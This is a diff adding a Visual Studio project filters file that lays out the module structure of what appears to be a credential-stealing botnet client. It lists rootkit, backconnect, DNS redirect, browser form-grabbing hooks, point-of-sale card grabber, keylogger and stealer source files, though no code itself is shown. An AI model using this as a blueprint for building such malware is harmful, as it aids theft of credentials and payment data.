@@ -1,0 +1,269 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Source Files\Backconnect">
+      <UniqueIdentifier>{7db3ce75-dfee-44ff-8a39-97d4e896d391}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Rootkit">
+      <UniqueIdentifier>{644ca5a4-ea76-4f87-95a4-0d9cd6486ad5}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\DNS_Redirect">
+      <UniqueIdentifier>{b38a21cb-6301-456b-b23b-bfea1be812e1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Browser Hooks">
+      <UniqueIdentifier>{1f5f69f6-efc0-47af-be5e-5d75a4266972}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Point-of-sales">
+      <UniqueIdentifier>{baf76170-a074-4ef6-963e-0205f7650455}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Keylogger">
+      <UniqueIdentifier>{47a22313-f4dc-4f44-a7f9-1c3d06eb8fad}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="Header Files\Backconnect">
+      <UniqueIdentifier>{0139b39d-eb76-4dc1-9fd5-a38d17c0a603}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Rootkit">
+      <UniqueIdentifier>{bae2a2d5-c9d3-4b03-9ddd-3f1b92ca32d3}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\DNS_Redirect">
+      <UniqueIdentifier>{ac9ce7f3-dd4c-4b15-ba35-d401726f58a0}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browser Hooks">
+      <UniqueIdentifier>{19412415-f6ed-4bcc-9155-603e33e11004}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Point-of-sales">
+      <UniqueIdentifier>{21f951bf-6ba0-49a3-bdae-323e554923e8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Keylogger">
+      <UniqueIdentifier>{8ff66331-0c6a-4353-8c0f-39f09399630e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="bot.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="botkiller.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="botThreads.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="common.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="connection.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="debug.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="dynamicconfig.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="inject.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="install.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="ipc.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="ipc_tasks.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="main.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="os_info.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="pipes.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="stealers.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="tasks.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="zombie.c">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="backconnect.c">
+      <Filter>Source Files\Backconnect</Filter>
+    </ClCompile>
+    <ClCompile Include="protocol.c">
+      <Filter>Source Files\Backconnect</Filter>
+    </ClCompile>
+    <ClCompile Include="file_persistence.c">
+      <Filter>Source Files\Rootkit</Filter>
+    </ClCompile>
+    <ClCompile Include="hook_manager.c">
+      <Filter>Source Files\Rootkit</Filter>
+    </ClCompile>
+    <ClCompile Include="hook_persistence.c">
+      <Filter>Source Files\Rootkit</Filter>
+    </ClCompile>
+    <ClCompile Include="rootkit.c">
+      <Filter>Source Files\Rootkit</Filter>
+    </ClCompile>
+    <ClCompile Include="unhooker.c">
+      <Filter>Source Files\Rootkit</Filter>
+    </ClCompile>
+    <ClCompile Include="userhooks.c">
+      <Filter>Source Files\Rootkit</Filter>
+    </ClCompile>
+    <ClCompile Include="dns_redirect.c">
+      <Filter>Source Files\DNS_Redirect</Filter>
+    </ClCompile>
+    <ClCompile Include="chromehooks.c">
+      <Filter>Source Files\Browser Hooks</Filter>
+    </ClCompile>
+    <ClCompile Include="formgrabber.c">
+      <Filter>Source Files\Browser Hooks</Filter>
+    </ClCompile>
+    <ClCompile Include="httpgrabber.c">
+      <Filter>Source Files\Browser Hooks</Filter>
+    </ClCompile>
+    <ClCompile Include="nss3.c">
+      <Filter>Source Files\Browser Hooks</Filter>
+    </ClCompile>
+    <ClCompile Include="wininet.c">
+      <Filter>Source Files\Browser Hooks</Filter>
+    </ClCompile>
+    <ClCompile Include="pos_grabber.c">
+      <Filter>Source Files\Point-of-sales</Filter>
+    </ClCompile>
+    <ClCompile Include="keylogger.c">
+      <Filter>Source Files\Keylogger</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="sqlite3.def">
+      <Filter>Source Files</Filter>
+    </None>
+    <None Include="sqlite3.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="bot.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="botkiller.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="botThreads.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="connection.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="debug.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="dynamicconfig.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="inject.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="install.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ipc.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ipc_tasks.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="modules.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="os_info.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="pipes.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="stealers.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="tasks.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="zlib\zconf.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="zlib\zlib.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="zombie.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="backconnect.h">
+      <Filter>Header Files\Backconnect</Filter>
+    </ClInclude>
+    <ClInclude Include="protocol.h">
+      <Filter>Header Files\Backconnect</Filter>
+    </ClInclude>
+    <ClInclude Include="file_persistence.h">
+      <Filter>Header Files\Rootkit</Filter>
+    </ClInclude>
+    <ClInclude Include="hook_manager.h">
+      <Filter>Header Files\Rootkit</Filter>
+    </ClInclude>
+    <ClInclude Include="hook_persistence.h">
+      <Filter>Header Files\Rootkit</Filter>
+    </ClInclude>
+    <ClInclude Include="rootkit.h">
+      <Filter>Header Files\Rootkit</Filter>
+    </ClInclude>
+    <ClInclude Include="unhooker.h">
+      <Filter>Header Files\Rootkit</Filter>
+    </ClInclude>
+    <ClInclude Include="userhooks.h">
+      <Filter>Header Files\Rootkit</Filter>
+    </ClInclude>
+    <ClInclude Include="dns_redirect.h">
+      <Filter>Header Files\DNS_Redirect</Filter>
+    </ClInclude>
+    <ClInclude Include="chromehooks.h">
+      <Filter>Header Files\Browser Hooks</Filter>
+    </ClInclude>
+    <ClInclude Include="formgrabber.h">
+      <Filter>Header Files\Browser Hooks</Filter>
+    </ClInclude>
+    <ClInclude Include="httpgrabber.h">
+      <Filter>Header Files\Browser Hooks</Filter>
+    </ClInclude>
+    <ClInclude Include="nss3.h">
+      <Filter>Header Files\Browser Hooks</Filter>
+    </ClInclude>
+    <ClInclude Include="wininet.h">
+      <Filter>Header Files\Browser Hooks</Filter>
+    </ClInclude>
+    <ClInclude Include="pos_grabber.h">
+      <Filter>Header Files\Point-of-sales</Filter>
+    </ClInclude>
+    <ClInclude Include="keylogger.h">
+      <Filter>Header Files\Keylogger</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="zlib\zlib.lib">
+      <Filter>Header Files</Filter>
+    </Library>
+  </ItemGroup>
+</Project>
